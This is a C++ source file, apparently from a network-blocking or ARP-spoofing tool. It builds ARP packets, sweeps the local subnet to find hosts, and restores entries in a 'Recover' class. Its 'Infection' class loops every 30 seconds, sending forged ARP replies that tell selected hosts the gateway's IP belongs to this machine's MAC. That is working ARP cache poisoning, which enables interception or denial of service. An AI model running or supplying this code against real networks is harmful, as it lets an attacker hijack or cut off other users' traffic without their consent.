#include "arppacket.h"
ARPPacket::ARPPacket()
{
    WNetInfo& wnetinfo = WNetInfo::instance();
    WIntfList& intflist = wnetinfo.intfList();
    mac_ip = instance.getDevice().intf()->gateway();
    intf_g = intflist.findByIp(mac_ip);
};

ARPPacket::~ARPPacket(){};

void ARPPacket::makeArppacket(WMac dmac, WMac smac, WMac tmac,WIp tip, WIp sip){
    packet.eth.dmac_ = dmac;
    packet.eth.smac_ = smac;
    packet.eth.type_ = htons(WEthHdr::Arp);

    packet.arp.hrd_ = htons(WArpHdr::ETHER);
    packet.arp.pro_ = htons(WEthHdr::Ip4);
    packet.arp.hln_ = WMac::SIZE;
    packet.arp.pln_ = WIp::SIZE;
    packet.arp.op_ = htons(WArpHdr::Request);
    packet.arp.smac_ = smac;
    packet.arp.sip_ = htonl(sip);
    packet.arp.tmac_ = tmac;
    packet.arp.tip_ = htonl(tip);
}

void Connection::send(){
    ARPPacket arp;
    WIntf* intf = instance.getDevice().intf();
    arp.makeArppacket(WMac("FF:FF:FF:FF:FF:FF"),intf->mac(),WMac("00:00:00:00:00:00"),WIp("0.0.0.0"),intf->ip());

    uint32_t beginIp = (intf->ip() & intf->mask())+1;
    uint32_t endIp = (intf->ip() | ~intf->mask())-1;
    map<WMac,Host>::iterator iter;

    for(iter = fs.getMap().begin(); iter!=fs.getMap().end();iter++){
        iter->second.active = 0;
    }

    //find all ip connected to the network
    for(uint32_t ip = beginIp; ip!=endIp; ip++){
        if(WIp(ip)==intf->gateway())continue;
        arp.getPacket().arp.tip_ = htonl(WIp(ip));
        fs.send_ARPpacket(arp.getPacket(),3);//send packet
    }
}

/*void Request::send(map<WMac,Host> map_){
    map<WMac,Host>::iterator iter;
    ARPPacket arp;

    while(check) {
        gtrace("<size>");
        std::cout<<map_.size()<<std::endl;

        for(iter = map_.begin(); iter!=map_.end();iter++) {
            gtrace("<sendarp>");
            gtrace("%s",std::string(iter->first).data());
            gtrace("%s",std::string((iter->second).ip_).data());

            arp.makeArppacket(iter->first,arp.instance.getDevice().intf()->mac(),iter->first,(iter->second).ip_,arp.instance.getDevice().intf()->gateway());
            fs.send_ARPpacket(arp.getPacket(),3);
            sleep(1);
        }
    }
}*/

void Recover::send(){
    ARPPacket arp;
    map<WMac,Host>::iterator iter_old;
    for(map<WMac,Host>::iterator iter_old = nb.getOldMap().begin(); iter_old!=nb.getOldMap().end();iter_old++){
        if(nb.getNewMap().find(iter_old->first)==nb.getNewMap().end()){//not exist
            arp.makeArppacket(iter_old->first,intf_g->mac(),iter_old->first,(iter_old->second).ip_,intf_g->ip());
            fs.send_ARPpacket(arp.getPacket(),3);
        }
    }
}

void Infection::send(){
    map<WMac,Host>::iterator iter;
    ARPPacket arp;

    while(check) {
        sleep(30);
        gtrace("<size>");
        std::cout<<nb.getOldMap().size()<<std::endl;
        if(nb.getOldMap().size()==0)continue;
        for(iter = nb.getOldMap().begin(); iter!=nb.getOldMap().end();iter++) {
            if(fs.getMap()[iter->first].active){//full-scan & policy
                gtrace("<sendarp>");
                gtrace("%s",std::string(iter->first).data());
                gtrace("%s",std::string((iter->second).ip_).data());

                arp.makeArppacket(iter->first,arp.instance.getDevice().intf()->mac(),iter->first,(iter->second).ip_,arp.instance.getDevice().intf()->gateway());
                arp.getPacket().arp.op_ = htons(WArpHdr::Reply);
                fs.send_ARPpacket(arp.getPacket(),3);
            }
        }
    }
}
